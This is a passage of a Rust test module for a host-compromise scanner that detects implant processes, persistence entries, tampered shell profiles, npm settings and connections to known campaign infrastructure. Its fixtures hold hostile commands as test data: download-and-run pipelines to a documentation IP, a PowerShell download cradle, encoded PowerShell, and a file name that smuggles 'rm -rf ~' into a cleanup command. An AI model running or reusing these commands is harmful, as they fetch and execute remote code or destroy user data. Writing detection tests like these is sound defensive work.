    let Some(scheme_end) = value.find("://").map(|at| at + 3) else {
        return value.to_string();
    };
    let (scheme, rest) = value.split_at(scheme_end);
    let authority_end = rest
        .find(|c: char| c == '/' || c.is_whitespace())
        .unwrap_or(rest.len());
    let (authority, tail) = rest.split_at(authority_end);
    match authority.rfind('@') {
        Some(at) => format!(
            "{scheme}<REDACTED>{}{tail}",
            authority.get(at..).unwrap_or_default()
        ),
        None => value.to_string(),
    }
}

/// One line of `~/.npmrc` with its secret removed.
fn redact_npmrc_line(line: &str) -> String {
    const SECRET_KEYS: &[&str] = &["_authToken=", "_auth=", "_password="];
    let cut = SECRET_KEYS
        .iter()
        .filter_map(|key| line.find(key).map(|at| at + key.len()))
        .min();
    match cut {
        Some(end) => format!(
            "{}<REDACTED-ROTATE-THIS>",
            line.get(..end).unwrap_or_default()
        ),
        None => redact_userinfo(line),
    }
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used, clippy::indexing_slicing)]
mod tests {
    use super::*;
    use crate::host::Snapshot;
    use crate::quarantine::{DryRun, Quarantine};
    use crate::verdict::{Entry, Level};

    // Synthetic indicators throughout. A repository that commits live ones
    // trips every scanner that clones it, its own included. 203.0.113.0/24 is
    // reserved for documentation and routes nowhere.
    const STRONG: &str = "MARKER-ALPHA";
    const IMPLANT: &str = "implant-process-name-x64";
    const C2: &str = "203.0.113.7";

    fn ind() -> Indicators {
        Indicators {
            strong: vec![STRONG.into()],
            network: vec![C2.into(), "c2.example".into()],
            implant_names: vec![IMPLANT.into()],
            ..Indicators::default()
        }
    }

    /// A scratch directory holding `home/` and `root/`.
    fn machine(name: &str, files: &[(&str, &str)]) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("prc-hostcheck-{}-{name}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("home")).expect("mkdir");
        fs::create_dir_all(dir.join("root")).expect("mkdir");
        for (file, body) in files {
            let path = dir.join(file);
            fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
            fs::write(path, body).expect("write");
        }
        dir
    }

    fn quiet(dir: &Path, platform: Platform) -> Snapshot {
        Snapshot::quiet(platform, dir.join("root"))
    }

    fn process(pid: u32, name: &str, command: &str) -> Process {
        Process {
            pid,
            name: name.into(),
            command: command.into(),
        }
    }

    fn has(v: &Verdict, level: Level, text: &str) -> bool {
        v.findings()
            .any(|f| f.level == level && f.message.contains(text))
    }

    fn details(v: &Verdict) -> Vec<String> {
        v.entries()
            .iter()
            .filter_map(|e| match e {
                Entry::Detail(d) => Some(d.clone()),
                _ => None,
            })
            .collect()
    }

    fn everything(v: &Verdict) -> String {
        v.entries()
            .iter()
            .map(|e| match e {
                Entry::Section(s) | Entry::Detail(s) | Entry::Note(s) => s.clone(),
                Entry::Finding(f) => {
                    format!("{} {}", f.message, f.remedy.clone().unwrap_or_default())
                }
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    // --- Windows --------------------------------------------------------------

    fn entry(place: &str, name: &str, command: &str) -> Autostart {
        Autostart {
            place: place.into(),
            name: name.into(),
            command: command.into(),
        }
    }

    const RUN: &str = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    fn windows_persistence(host: &Snapshot, dir: &Path) -> Verdict {
        let q = Quarantine::<DryRun>::new(dir.join("q"));
        let mut v = Verdict::new();
        persistence(host, &dir.join("home"), &ind(), &mut v, &mut Sink::Dry(&q));
        v
    }

    #[test]
    fn on_windows_the_implant_is_matched_by_image_name_whatever_its_case() {
        let dir = machine("win-implant", &[]);
        let mut host = quiet(&dir, Platform::Windows);
        host.processes = Probe::Read(vec![
            process(4, "System", ""),
            process(900, &format!("{}.EXE", IMPLANT.to_uppercase()), "C:\\x"),
            // Mentions it and is not it.
            process(901, "powershell.exe", &format!("findstr {IMPLANT} log.txt")),
            // A longer name that only begins with the implant's.
            process(902, &format!("{IMPLANT}Helper.exe"), ""),
        ]);
        let mut v = Verdict::new();
        assert_eq!(
            implant_processes(&host, &ind(), &mut v),
            ProcessCheck::Running
        );
        assert_eq!(details(&v).len(), 1);
        assert!(details(&v)[0].starts_with("900 "));
        // Supplied state: no command with a pid from another machine.
        assert!(!everything(&v).contains("Stop-Process"));
    }

    #[test]
    fn a_run_key_is_confirmed_by_an_indicator_or_the_implant_and_says_how_to_remove_it() {
        let dir = machine("win-runkeys", &[]);
        let mut host = quiet(&dir, Platform::Windows);
        host.run_keys = Probe::Read(vec![
            entry(
                RUN,
                "OneDrive",
                "\"C:\\Program Files\\OneDrive\\OneDrive.exe\" /background",
            ),
            entry(RUN, "It's Updater", &format!("node C:\\x.js {STRONG}")),
            entry(
                RUN,
                "Helper",
                &format!("C:\\Users\\x\\AppData\\Local\\{IMPLANT}.exe --quiet"),
            ),
            entry(RUN, "Fetcher", "PowerShell -Enc SQBFAFgA"),
            // Somebody else's program whose name begins with the implant's.
            entry(RUN, "Other", &format!("C:\\tools\\{IMPLANT}Viewer.exe")),
        ]);
        let v = windows_persistence(&host, &dir);
        let all = everything(&v);
        assert!(has(
            &v,
            Level::Hit,
            &format!("run key entry contains an indicator: {RUN}\\It's Updater")
        ));
        // The quote in the name cannot close the quote in the command.
        assert!(all.contains(&format!(
            "remove it: Remove-ItemProperty -Path '{RUN}' -Name 'It''s Updater'"
        )));
        assert!(has(
            &v,
            Level::Hit,
            &format!("implant run key entry: {RUN}\\Helper")
        ));
        assert!(has(
            &v,
            Level::Review,
            "run key entry runs a network or interpreter command"
        ));
        assert_eq!(v.hits(), 2);
        assert_eq!(v.reviews(), 1);
        assert!(!has(&v, Level::Hit, "Other") && !has(&v, Level::Review, "Other"));
        assert!(v
            .findings()
            .filter(|f| f.level == Level::Hit)
            .all(|f| f.kind == Some(Kind::Autostart)));
    }

    #[test]
    fn windows_own_tasks_are_checked_and_not_listed_and_the_implant_cannot_hide_among_them() {
        let dir = machine("win-tasks", &[]);
        let mut host = quiet(&dir, Platform::Windows);
        host.scheduled_tasks = Probe::Read(vec![
            // Windows' own, running PowerShell over http: checked, not listed.
            entry(
                "\\Microsoft\\Windows\\Update\\",
                "Scan",
                "powershell.exe -File http-check.ps1",
            ),
            entry("\\", "Backup", "C:\\tools\\backup.exe --all"),
            entry(
                "\\",
                "Nightly",
                "powershell -c iex (irm http://example.test/a)",
            ),
            entry(
                "\\Microsoft\\Windows\\",
                IMPLANT,
                "C:\\ProgramData\\svc.exe",
            ),
        ]);
        let v = windows_persistence(&host, &dir);
        assert!(has(
            &v,
            Level::Hit,
            &format!("implant scheduled task registered: \\Microsoft\\Windows\\{IMPLANT}")
        ));
        assert!(everything(&v).contains(&format!(
            "remove it: Unregister-ScheduledTask -TaskName '{IMPLANT}' -TaskPath '\\Microsoft\\Windows\\' -Confirm:$false"
        )));
        assert!(has(
            &v,
            Level::Review,
            "scheduled task runs a network or interpreter command: \\Nightly"
        ));
        assert_eq!((v.hits(), v.reviews()), (1, 1));
        assert!(!everything(&v).contains("Scan"));
    }

    #[test]
    fn the_startup_folder_is_read_and_desktop_ini_is_not_an_item() {
        let startup = "home/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
        let dir = machine(
            "win-startup",
            &[
                (&format!("{startup}/desktop.ini"), "[.ShellClassInfo]\n"),
                (
                    &format!("{startup}/updater.bat"),
                    &format!("node x.js {STRONG}\n"),
                ),
                (&format!("{startup}/notes.lnk"), "shortcut\n"),
                (
                    "root/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/all.cmd",
                    &format!("echo {STRONG}\n"),
                ),
            ],
        );
        let v = windows_persistence(&quiet(&dir, Platform::Windows), &dir);
        assert!(has(&v, Level::Hit, "updater.bat"));
        assert!(has(&v, Level::Hit, "all.cmd"));
        assert!(has(
            &v,
            Level::Review,
            "startup item present, verify by hand"
        ));
        assert_eq!((v.hits(), v.reviews()), (2, 1));
        assert!(!everything(&v).contains("desktop.ini"));
    }

    #[test]
    fn a_quiet_windows_machine_is_clean_and_an_unread_registry_is_not() {
        let dir = machine("win-quiet", &[]);
        let mut host = quiet(&dir, Platform::Windows);
        let v = windows_persistence(&host, &dir);
        assert_eq!((v.hits(), v.reviews()), (0, 0), "{}", everything(&v));
        assert!(has(
            &v,
            Level::Ok,
            "0 Run key entries, none containing an indicator"
        ));

        host.run_keys = Probe::Failed("powershell: access denied".into());
        host.scheduled_tasks = Probe::NoTool("powershell is not available".into());
        let v = windows_persistence(&host, &dir);
        assert!(has(
            &v,
            Level::Review,
            "could not read the registry Run keys"
        ));
        assert!(has(&v, Level::Review, "could not list the scheduled tasks"));
    }

    #[test]
    fn a_powershell_profile_that_downloads_and_runs_code_is_a_hit_and_a_comment_is_not() {
        let profile = "home/Documents/PowerShell/Microsoft.PowerShell_profile.ps1";
        let dir = machine(
            "win-profile",
            &[
                (profile, "Set-Alias ll ls\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\n"),
                (
                    "home/Documents/WindowsPowerShell/profile.ps1",
                    "# iex (irm http://example.test/install.ps1)\nSet-Alias g git\n",
                ),
            ],
        );
        let mut v = Verdict::new();
        shell_startup(&dir.join("home"), Platform::Windows, &ind(), &mut v);
        assert!(has(
            &v,
            Level::Hit,
            "PowerShell profile downloads and executes code"
        ));
        assert!(has(&v, Level::Ok, "clean: "));
        assert_eq!(v.hits(), 1);

        let empty = machine("win-noprofile", &[]);
        let mut v = Verdict::new();
        shell_startup(&empty.join("home"), Platform::Windows, &ind(), &mut v);
        assert!(has(
            &v,
            Level::Ok,
            "no PowerShell profile in the home directory"
        ));
    }

    #[test]
    fn inline_code_is_seen_through_a_quoted_windows_path() {
        assert!(runs_inline_code(
            "\"C:\\Program Files\\nodejs\\node.exe\" -e \"require('x')\""
        ));
        assert!(runs_inline_code("python3.12.exe -c pass"));
        assert!(!runs_inline_code(
            "\"C:\\Program Files\\nodejs\\node.exe\" server.js"
        ));
    }

    // --- implant processes --------------------------------------------------

    #[test]
    fn a_running_implant_is_a_hit_with_nothing_on_disk() {
        let dir = machine("implant-running", &[]);
        let mut host = quiet(&dir, Platform::MacOs);
        host.processes = Probe::Read(vec![
            process(1, "/sbin/launchd", "/sbin/launchd"),
            process(
                4242,
                &format!("/Users/x/{IMPLANT}"),
                &format!("/Users/x/{IMPLANT}"),
            ),
        ]);
        let mut v = Verdict::new();
        assert_eq!(
            implant_processes(&host, &ind(), &mut v),
            ProcessCheck::Running
        );
        assert!(has(&v, Level::Hit, "an implant process is running now"));
        assert!(details(&v).iter().any(|d| d.starts_with("4242 ")));
    }

    #[test]
    fn mentioning_the_implant_on_a_command_line_is_not_running_it() {
        // An administrator grepping for it, an editor with the indicator file
        // open, this scanner. The name is compared, never the command line.
        let dir = machine("implant-mention", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.processes = Probe::Read(vec![
            process(10, "grep", &format!("grep -r {IMPLANT} /home")),
            process(11, "vim", &format!("vim ioc/{IMPLANT}.txt")),
        ]);
        let mut v = Verdict::new();
        assert_eq!(
            implant_processes(&host, &ind(), &mut v),
            ProcessCheck::NoneRunning
        );
        assert_eq!(v.hits(), 0);
    }

    #[test]
    fn a_kill_command_is_only_printed_for_the_machine_it_would_run_on() {
        let dir = machine("implant-supplied", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.processes = Probe::Read(vec![process(4242, "implant-process", "x")]);
        let mut v = Verdict::new();
        implant_processes(&host, &ind(), &mut v);
        assert!(has(&v, Level::Hit, "an implant process is running now"));
        assert!(
            !everything(&v).contains("kill -9"),
            "a pid from supplied state is another machine's pid"
        );
    }

    #[test]
    fn a_process_table_that_could_not_be_read_is_not_a_clean_one() {
        let dir = machine("implant-unread", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.processes = Probe::Failed("ps: permission denied".into());
        let mut v = Verdict::new();
        assert_eq!(
            implant_processes(&host, &ind(), &mut v),
            ProcessCheck::NotRead
        );
        assert!(has(&v, Level::Review, "could not read the process table"));

        let mut v = Verdict::new();
        interpreters(&host, &ind(), &mut v);
        assert!(has(&v, Level::Review, "could not read the process table"));
        assert!(!has(&v, Level::Ok, "no interpreter"));
    }

    // --- persistence --------------------------------------------------------

    #[test]
    fn a_systemd_unit_with_an_indicator_is_a_hit_and_a_dry_run_leaves_it() {
        let unit = "home/.config/systemd/user/updater.service";
        let dir = machine(
            "systemd-hit",
            &[
                (
                    unit,
                    &format!("[Service]\nExecStart=/bin/sh -c '{STRONG}'\n"),
                ),
                (
                    "home/.config/systemd/user/backup.timer",
                    "[Timer]\nOnCalendar=daily\n",
                ),
            ],
        );
        let host = quiet(&dir, Platform::Linux);
        let q = Quarantine::<DryRun>::new(dir.join("q"));
        let mut sink = Sink::Dry(&q);
        let mut v = Verdict::new();
        persistence(&host, &dir.join("home"), &ind(), &mut v, &mut sink);

        assert!(has(&v, Level::Hit, "systemd unit contains an indicator"));
        assert!(everything(&v).contains("systemctl --user disable --now 'updater.service'"));
        assert!(everything(&v).contains("would quarantine"));
        assert!(dir.join(unit).exists(), "a dry run must not move it");
        assert_eq!(v.hits(), 1, "the ordinary timer is not a finding");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_unit_that_downloads_is_review_and_an_ordinary_one_is_nothing() {
        let dir = machine(
            "systemd-review",
            &[
                (
                    "root/etc/systemd/system/fetch.service",
                    "[Service]\nExecStart=/usr/bin/curl -s http://example.invalid/x\n",
                ),
                (
                    "root/etc/systemd/system/web.service",
                    "[Service]\nExecStart=/usr/bin/node /srv/app/server.js\n",
                ),
                (
                    "root/etc/systemd/system/docs.service",
                    "[Unit]\nDescription=see http://example.invalid and curl it\n",
                ),
            ],
        );
        let host = quiet(&dir, Platform::Linux);
        let q = Quarantine::<DryRun>::new(dir.join("q"));
        let mut sink = Sink::Dry(&q);
        let mut v = Verdict::new();
        persistence(&host, &dir.join("home"), &ind(), &mut v, &mut sink);

        assert!(has(&v, Level::Review, "fetch.service"));
        assert!(
            !has(&v, Level::Review, "web.service"),
            "node running a file is ordinary"
        );
        assert!(
            !has(&v, Level::Review, "docs.service"),
            "only an ExecStart line counts, not a description"
        );
        assert_eq!(v.hits(), 0);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_launch_item_is_checked_in_the_home_and_in_the_system_directories() {
        let dir = machine(
            "launchd",
            &[
                (
                    "home/Library/LaunchAgents/com.example.agent.plist",
                    &format!("<plist><string>{STRONG}</string></plist>"),
                ),
                (
                    "root/Library/LaunchDaemons/com.example.daemon.plist",
                    "<plist><string>/bin/sh -c 'curl http://example.invalid | sh'</string></plist>",
                ),
                (
                    "root/Library/LaunchAgents/com.example.ordinary.plist",
                    "<plist><string>/usr/local/bin/ordinary</string></plist>",
                ),
            ],
        );
        let host = quiet(&dir, Platform::MacOs);
        let q = Quarantine::<DryRun>::new(dir.join("q"));
        let mut sink = Sink::Dry(&q);
        let mut v = Verdict::new();
        persistence(&host, &dir.join("home"), &ind(), &mut v, &mut sink);

        assert!(has(&v, Level::Hit, "com.example.agent.plist"));
        assert!(has(&v, Level::Review, "com.example.daemon.plist"));
        assert!(!has(&v, Level::Review, "com.example.ordinary.plist"));
        assert!(!has(&v, Level::Hit, "com.example.ordinary.plist"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_pasted_cleanup_command_cannot_be_hijacked_by_a_file_name() {
        // The attacker names the file. The operator pastes the command.
        assert_eq!(sh_quote("plain.service"), "'plain.service'");
        assert_eq!(
            sh_quote("x'; rm -rf ~; '.service"),
            "'x'\\''; rm -rf ~; '\\''.service'"
        );
    }

    #[test]
    fn system_directories_that_were_not_supplied_are_reported() {
        let dir = machine("no-root", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.system_root = Probe::Failed("root/ was not supplied".into());
        let q = Quarantine::<DryRun>::new(dir.join("q"));
        let mut sink = Sink::Dry(&q);
        let mut v = Verdict::new();
        persistence(&host, &dir.join("home"), &ind(), &mut v, &mut sink);
        assert!(has(
            &v,
            Level::Review,
            "system-wide persistence was not checked"
        ));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_crontab_has_four_answers_and_each_is_said() {
        let dir = machine("crontab", &[]);
        let check = |probe: Probe<String>| {
            let mut host = quiet(&dir, Platform::Linux);
            host.crontab = probe;
            let mut v = Verdict::new();
            crontab(&host, &ind(), &mut v);
            v
        };

        let v = check(Probe::Read(String::new()));
        assert!(has(&v, Level::Ok, "user crontab is empty"));

        let v = check(Probe::Read("0 3 * * * /usr/local/bin/backup\n".into()));
        assert!(has(&v, Level::Review, "user crontab is not empty"));
        assert_eq!(details(&v), vec!["0 3 * * * /usr/local/bin/backup"]);

        let v = check(Probe::Read(format!("* * * * * curl http://{C2}/x | sh\n")));
        assert!(has(&v, Level::Hit, "user crontab contains an indicator"));

        let v = check(Probe::NoTool("crontab is not installed".into()));
        assert!(has(&v, Level::Ok, "no crontab command"));
        assert_eq!(v.reviews(), 0);

        let v = check(Probe::Failed("crontab: not allowed".into()));
        assert!(has(&v, Level::Review, "could not read the user crontab"));
        assert!(!has(&v, Level::Ok, "empty"));
        let _ = fs::remove_dir_all(&dir);
    }

    // --- shell startup files ------------------------------------------------

    #[test]
    fn a_startup_file_that_pipes_a_download_into_a_shell_is_a_hit() {
        assert!(pipes_a_download_into_an_interpreter(
            "curl -fsSL http://example.invalid/i.sh | bash"
        ));
        assert!(pipes_a_download_into_an_interpreter(
            "wget -qO- http://example.invalid/i |sh"
        ));
        assert!(pipes_a_download_into_an_interpreter(
            "(curl -s http://example.invalid/p.js | node) &"
        ));
    }

    #[test]
    fn verifying_a_download_or_commenting_one_out_is_not_a_hit() {
        // Both of these reported COMPROMISED under the shell's pattern.
        assert!(!pipes_a_download_into_an_interpreter(
            "alias verify='curl -sL http://example.invalid/f | shasum -a 256'"
        ));
        assert!(!pipes_a_download_into_an_interpreter(
            "  # curl -fsSL http://example.invalid/install.sh | bash"
        ));
        assert!(!pipes_a_download_into_an_interpreter(
            "curl -s http://example.invalid/data | jq ."
        ));
        assert!(!pipes_a_download_into_an_interpreter("echo hello | bash"));
    }

    #[test]
    fn startup_files_report_each_file_and_say_so_when_there_are_none() {
        let dir = machine(
            "shellrc",
            &[
                ("home/.zshrc", "export PATH=$HOME/bin:$PATH\n"),
                ("home/.bashrc", &format!("eval \"$(echo {STRONG})\"\n")),
            ],
        );
        let mut v = Verdict::new();
        shell_startup(&dir.join("home"), Platform::Linux, &ind(), &mut v);
        assert!(has(&v, Level::Ok, ".zshrc"));
        assert!(has(&v, Level::Hit, ".bashrc"));
        assert!(everything(&v).contains("never quarantined"));

        let empty = machine("shellrc-none", &[]);
        let mut v = Verdict::new();
        shell_startup(&empty.join("home"), Platform::MacOs, &ind(), &mut v);
        assert!(has(&v, Level::Ok, "no shell startup files"));
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&empty);
    }

    // --- git ----------------------------------------------------------------

    #[test]
    fn a_global_hooks_path_is_review_and_a_proxy_password_is_not_printed() {
        let dir = machine("git", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.git_global_config = Probe::Read(vec![
            "user.name=Someone".into(),
            "core.hookspath=/home/x/.hooks".into(),
            "http.proxy=http://someone:hunter2@proxy.example:3128".into(),
            "url.https://mirror.example/.insteadof=https://github.com/".into(),
        ]);
        let mut v = Verdict::new();
        git_global_config(&host, &mut v);
        assert!(has(
            &v,
            Level::Review,
            "global core.hooksPath is set to: /home/x/.hooks"
        ));
        let all = everything(&v);
        assert!(all.contains("insteadof"));
        assert!(all.contains("proxy.example"));
        assert!(!all.contains("hunter2"), "{all}");
        assert!(
            !all.contains("user.name"),
            "only the redirecting keys are listed"
        );

        let mut v = Verdict::new();
        git_global_config(&quiet(&dir, Platform::Linux), &mut v);
        assert!(has(&v, Level::Ok, "no global core.hooksPath"));
        let _ = fs::remove_dir_all(&dir);
    }

    // --- npm ----------------------------------------------------------------

    #[test]
    fn an_npm_token_never_reaches_the_report() {
        let dir = machine(
            "npm-token",
            &[(
                "home/.npmrc",
                "//registry.npmjs.org/:_authToken=npm_SECRETSECRETSECRET\nemail=x@example.invalid\n",
            )],
        );
        let mut v = Verdict::new();
        npm_config(&dir.join("home"), &ind(), &mut v);
        let all = everything(&v);
        assert!(!all.contains("npm_SECRET"), "{all}");
        assert!(all.contains("_authToken=<REDACTED-ROTATE-THIS>"));
        assert!(has(&v, Level::Info, "an npm auth token is stored on disk"));
        assert_eq!(v.hits() + v.reviews(), 0, "owning a token is not a finding");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_private_registry_is_review_and_the_campaign_registry_is_a_hit() {
        // A false COMPROMISED is worse than a missed review. Every company
        // with an internal registry has this line.
        let dir = machine(
            "npm-registry",
            &[("home/.npmrc", "registry=https://npm.corp.example/\n")],
        );
        let mut v = Verdict::new();
        npm_config(&dir.join("home"), &ind(), &mut v);
        assert!(has(&v, Level::Review, "non-default npm registry"));
        assert_eq!(v.hits(), 0);

        let bad = machine(
            "npm-registry-bad",
            &[("home/.npmrc", "registry=https://c2.example/npm/\n")],
        );
        let mut v = Verdict::new();
        npm_config(&bad.join("home"), &ind(), &mut v);
        assert!(has(&v, Level::Hit, "known campaign infrastructure"));

        let default = machine(
            "npm-registry-default",
            &[(
                "home/.npmrc",
                "registry=https://registry.npmjs.org/\nignore-scripts=true\n",
            )],
        );
        let mut v = Verdict::new();
        npm_config(&default.join("home"), &ind(), &mut v);
        assert_eq!(v.hits() + v.reviews(), 0);
        assert!(has(&v, Level::Ok, "ignore-scripts is on"));
        for d in [dir, bad, default] {
            let _ = fs::remove_dir_all(&d);
        }
    }

    // --- interpreters -------------------------------------------------------

    #[test]
    fn inline_code_is_recognised_and_running_a_file_is_not() {
        assert!(runs_inline_code("node -e require('x')"));
        assert!(runs_inline_code("/usr/bin/python3.12 -c import os"));
        assert!(runs_inline_code("python  -c pass"));
        assert!(!runs_inline_code("node server.js"));
        assert!(!runs_inline_code("node --enable-source-maps app.js"));
        assert!(!runs_inline_code("python3 -m http.server"));
        assert!(!runs_inline_code("bash -c 'echo node'"));
    }

    #[test]
    fn an_interpreter_running_inline_code_is_review_and_implant_code_is_a_hit() {
        let dir = machine("interp", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.processes = Probe::Read(vec![
            process(50, "node", "node /srv/app/server.js"),
            process(51, "node", "node -e console.log(1)"),
        ]);
        let mut v = Verdict::new();
        interpreters(&host, &ind(), &mut v);
        assert!(has(
            &v,
            Level::Review,
            "running code passed on the command line"
        ));
        assert_eq!(details(&v), vec!["51 node -e console.log(1)"]);

        host.processes = Probe::Read(vec![process(
            52,
            "node",
            &format!("node -e require('/tmp/{IMPLANT}')"),
        )]);
        let mut v = Verdict::new();
        interpreters(&host, &ind(), &mut v);
        assert!(has(&v, Level::Hit, "running implant code right now"));

        host.processes = Probe::Read(vec![process(50, "node", "node /srv/app/server.js")]);
        let mut v = Verdict::new();
        interpreters(&host, &ind(), &mut v);
        assert!(has(&v, Level::Ok, "no interpreter running inline code"));
        let _ = fs::remove_dir_all(&dir);
    }

    // --- connections --------------------------------------------------------

    #[test]
    fn a_connection_to_the_campaign_is_a_hit_whatever_process_holds_it() {
        // The second stage is a native binary. Filtering to node and Electron
        // first, as the shell did, never looks at its sockets.
        let dir = machine("conn-hit", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.connections = Probe::Read(vec![
            "ESTAB 0 0 10.0.0.2:40000 198.51.100.4:443 users:((\"node\",pid=9,fd=20))".into(),
            format!("ESTAB 0 0 10.0.0.2:40001 {C2}:443 users:((\"updater\",pid=8,fd=3))"),
        ]);
        let mut v = Verdict::new();
        connections(&host, &ind(), &mut v);
        assert!(has(
            &v,
            Level::Hit,
            "live connection to known campaign infrastructure"
        ));
        assert_eq!(
            details(&v).len(),
            1,
            "only the campaign connection is evidence"
        );
    }

    #[test]
    fn an_address_that_merely_contains_a_campaign_address_is_not_a_hit() {
        let dir = machine("conn-near", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.connections = Probe::Read(vec![format!(
            "ESTAB 0 0 10.0.0.2:40001 {C2}1:443 users:((\"node\",pid=8,fd=3))"
        )]);
        let mut v = Verdict::new();
        connections(&host, &ind(), &mut v);
        assert_eq!(v.hits(), 0);
        assert!(has(
            &v,
            Level::Ok,
            "1 established connections from editors and node"
        ));
    }

    #[test]
    fn no_socket_tool_is_reported_not_passed() {
        let dir = machine("conn-notool", &[]);
        let mut host = quiet(&dir, Platform::Linux);
        host.connections = Probe::NoTool("neither ss nor netstat available".into());
        let mut v = Verdict::new();
        connections(&host, &ind(), &mut v);
        assert!(has(
            &v,
            Level::Review,
            "neither ss nor netstat available, skipped"
        ));

        let mut v = Verdict::new();
        connections(&quiet(&dir, Platform::MacOs), &ind(), &mut v);
        assert!(has(
            &v,
            Level::Ok,
            "no established node or Electron TCP connections"
        ));
        let _ = fs::remove_dir_all(&dir);
    }

    // --- redaction ----------------------------------------------------------

    #[test]
    fn credentials_in_a_url_are_removed_and_the_host_is_kept() {
        assert_eq!(
            redact_userinfo("https://user:secret@npm.corp.example/path"),
            "https://<REDACTED>@npm.corp.example/path"
        );
        assert_eq!(
            redact_userinfo("https://npm.corp.example/@scope/pkg"),
            "https://npm.corp.example/@scope/pkg"
        );
        assert_eq!(redact_userinfo("not a url"), "not a url");
        assert_eq!(
            redact_npmrc_line("//npm.corp.example/:_password=aHVudGVyMg=="),
            "//npm.corp.example/:_password=<REDACTED-ROTATE-THIS>"
        );
    }
}
